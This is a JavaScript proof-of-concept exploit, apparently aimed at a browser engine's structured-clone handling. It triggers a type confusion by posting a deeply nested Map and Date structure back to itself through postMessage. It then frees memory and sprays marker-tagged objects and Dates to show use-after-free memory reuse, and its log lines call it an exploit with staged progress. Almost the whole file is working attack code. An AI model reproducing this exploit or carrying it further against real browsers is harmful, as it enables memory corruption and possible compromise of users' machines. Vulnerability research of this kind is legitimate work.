import { debug_log } from './module/utils.mjs';
import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';
import { MB } from './module/constants.mjs';

const POC_MODE = (() => {
    try {
        const qs = globalThis?.location?.search ?? '';
        const v = new URLSearchParams(qs).get('mode');
        return v ?? 'crash';
    } catch {
        return 'crash';
    }
})();

function sleep(ms = 20) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 
function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function pressureAlloc(rounds = 16, size = 0x200000) {
    const keep = [];
    for (let i = 0; i < rounds; i++) {
        keep.push(new ArrayBuffer(size));
    }
    return keep;
}

function describeValue(v) {
    const t = typeof v;
    if (v === null)
        return 'null';
    if (t !== 'object' && t !== 'function')
        return `${t}:${String(v)}`;

    let ctor = '';
    try {
        ctor = v?.constructor?.name ?? '';
    } catch {}

    let tag = '';
    try {
        tag = Object.prototype.toString.call(v);
    } catch {}

    return `${t}${ctor ? `(${ctor})` : ''} ${tag}`;
}

function tryGet(obj, prop) {
    try {
        return obj?.[prop];
    } catch {
        return undefined;
    }
}

function sprayReplacementObjects(count = 50000) {
    const MARKER = 0x41414141;
    const keepers = [];
    for (let i = 0; i < count; i++) {
        const o = { id: 0x1337, marker: MARKER, idx: i };
        o.p0 = 13.37;
        o.p1 = 13.38;
        keepers.push(o);
    }
    return keepers;
}

function sprayReplacementDates(count = 60000, marker = 0x41414141) {
    const keepers = [];
    for (let i = 0; i < count; i++) {
        keepers.push(new Date(marker));
    }
    return keepers;
}

function buildIdentityMap(arr) {
    const m = new Map();
    for (let i = 0; i < arr.length; i++) {
        m.set(arr[i], i);
    }
    return m;
}

function sprayStructures() {
    const keepers = [];
    for (let i = 0; i < 50000; i++) {
        let o = {a: 1};
        o['p' + i] = i; 
        keepers.push(o);
    }
    return keepers;
}
 
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Markers to identify the confusion
    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}
 
export async function main() {
    debug_log("[*] Exploit started...");
    debug_log('[*] Mode: ' + String(POC_MODE));
    
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;
    let attempts = 0;

    let warm = null;
    if (POC_MODE !== 'crash')
        warm = sprayStructures();

    debug_log("[*] Starting Stage 1: Triggering Logic Error...");

    while (true) {
        attempts++;
        if (attempts % 100 === 0) debug_log("[*] Attempt " + attempts);

        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();
        await sleep(0);

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                const k = data.keys().next().value;
                if (k.getTime() === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            try {
                data2 = data.keys().next().value;
            } catch {
                data2 = null;
            }
            break;
        }
    }

    debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);

    if (POC_MODE === 'crash') {
        alert('triggered, try crash');
        debug_log('[+] idx: ' + idx);
        return;
    }
    
    if (data2) {
        debug_log("[*] Starting Stage 2: Verifying controllable corruption...");
        debug_log('[*] data2: ' + describeValue(data2));
        
        // 1. Release references
        root = null;
        msg = null;
        warm = null;
        
        // 2. Freeing
        debug_log('[*] Freeing original structures...');
        for (let k = 0; k < 100; k++) {
            gc();
        }
        await sleep(100);

        debug_log('[*] Spraying replacement objects...');
        const isDate = (() => {
            try {
                return data2 instanceof Date;
            } catch {
                return false;
            }
        })();

        const sprayed = isDate ? sprayReplacementDates(70000, 0x41414141) : sprayReplacementObjects(60000);
        const sprayedMap = buildIdentityMap(sprayed);

        pressureAlloc(12, 2 * MB);
        for (let k = 0; k < 50; k++)
            gc();
        await sleep(20);

        let reusedIdx = -1;
        try {
            if (sprayedMap.has(data2))
                reusedIdx = sprayedMap.get(data2);
        } catch {}

        const marker = tryGet(data2, 'marker');
        const rid = tryGet(data2, 'id');
        const rix = tryGet(data2, 'idx');
        let dt = undefined;
        try {
            if (typeof data2?.getTime === 'function')
                dt = data2.getTime();
        } catch {
            dt = 'throw';
        }

        debug_log('[*] Probe identityReuse=' + String(reusedIdx) + ' getTime=' + String(dt) + ' id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));

        if (reusedIdx !== -1) {
            debug_log('[+] Strong reuse proof: data2 is identical to a sprayed object (identity hit).');
        }

        if (marker === 0x41414141) {
            debug_log('[+] Memory reuse observed (marker hit). This is more than a pure DoS signal.');
        } else if (dt === 0x41414141) {
            debug_log('[+] Memory reuse observed (Date getTime marker hit). This is more than a pure DoS signal.');
        } else {
            debug_log('[!] No marker observed on data2. Still indicates corruption; consider increasing message size/spray.');
        }

        if (sprayed.length === 0) {
            debug_log('');
        }
    } else {
        debug_log("[-] Failed to get confused object.");
    }
}
